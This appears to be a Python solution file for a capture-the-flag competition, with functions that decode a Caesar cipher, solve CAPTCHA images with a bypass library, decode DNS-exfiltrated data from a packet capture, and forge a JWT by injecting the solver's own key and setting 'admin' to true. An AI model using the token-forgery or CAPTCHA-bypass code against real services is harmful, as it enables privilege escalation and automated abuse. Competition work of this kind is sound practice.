import base64
import json
import numpy as np
import cv2
from jwcrypto import jwt, jwk
from Crypto.PublicKey import RSA 
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, IP
from amazoncaptcha import AmazonCaptcha
from PIL import Image

def cipher_solver(encoded_string):
    if '=' not in encoded_string:
        encoded_string += "====="
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode('utf-8')
    stripped_string = decoded_string.strip('()')
    cipher = stripped_string.split(',')[0]
    key = stripped_string.split(',')[1]
    key = int(key, 2)
    ascii_cipher = ""
    for i in range(0, len(cipher), 7):
        char = cipher[i:i + 7]
        char = int(char, 2)
        ascii_cipher += chr(char)
    solution = ""
    for i in ascii_cipher:
        if i.isupper():
            solution += chr((ord(i) - key - 65) % 26 + 65)
        elif i.islower():
            solution += chr((ord(i) - key - 97) % 26 + 97)
        else:
            solution += i
    return solution
    # pass

def captcha_solver(np_arr):
    np_array = np.array(np_arr)
    pil_img = Image.fromarray(np_array)
    pil_img = pil_img.convert('RGB')
    pil_img.save('image.png', bitmap_format='png')
    captcha = AmazonCaptcha('image.png')
    return captcha.solve()
    # pass

def pcap_solver(pcap):
    domains = []
    secret = {}
    solution = ""
    # Parsing encoded content to a pcap file
    encoded_pcap = pcap
    decoded_pcap = base64.b64decode(encoded_pcap)
    with open('pcap_file.pcap', 'wb') as pcap:
        pcap.write(bytearray(decoded_pcap))
    # Reading the dns packets 
    dns_packets = rdpcap('pcap_file.pcap')
    for packet in dns_packets:
        if packet.haslayer(DNS):
            dst = packet[IP].dst
            rec_type = packet[DNSQR].qtype
            # Checking for A records and the unokown dns server 
            if rec_type == 1 and dst == '188.68.45.12':
                record = packet[DNSQR].qname.decode('utf-8').strip('.')
                # Getting the unique domains 
                if record not in domains:
                    domains.append(record)
    # Decoding the exfilterated data 
    for domain in domains:
        # Getting the position of the word  
        pos = domain.split('.')[0]
        pos = base64.b64decode(pos + '====')
        pos = pos.decode()
        data = domain.split('.')[1]
        data = base64.b64decode(data + '====')
        data = data.decode()
        secret[int(pos)] = data
    # Sorting the words and printin the secret
    sorted_keys = sorted(secret)
    for key in sorted_keys:
        solution += secret[key]
    return solution
    # pass

def server_solver(token):
    # getting the token original headers 
    headers = token.split('.')[0]
    headers = base64.b64decode(headers + "===")
    headers = headers.decode('utf-8')
    headers = json.loads(headers)
    # getting the token original payload
    payload = token.split('.')[1]
    payload = base64.b64decode(payload + "===")
    payload = payload.decode('utf-8')
    payload = json.loads(payload)
    # creating our JWK
    with open('C:\\Users\\INTEL\\HackTrick23\\gym-maze\\keypair.pem', 'rb') as pem_file:
        key = jwk.JWK.from_pem(pem_file.read())
    public_key = key.export(private_key=False)
    # key = RSA.generate(2048)
    # public_key = key.publickey().export_key("PEM")
    # priv_key = key.export_key("PEM")
    # key = jwk.JWK.from_pem(priv_key)
    # public_key = key.export(private_key=False)
    # altering the token and adding our JWK
    headers['kid'] = json.loads(public_key)['kid']
    headers['jwk'] = json.loads(public_key)
    payload['admin'] = 'true'
    Token = jwt.JWT(header=headers, claims=payload)
    # signing the token
    Token.make_signed_token(key)
    return Token.serialize()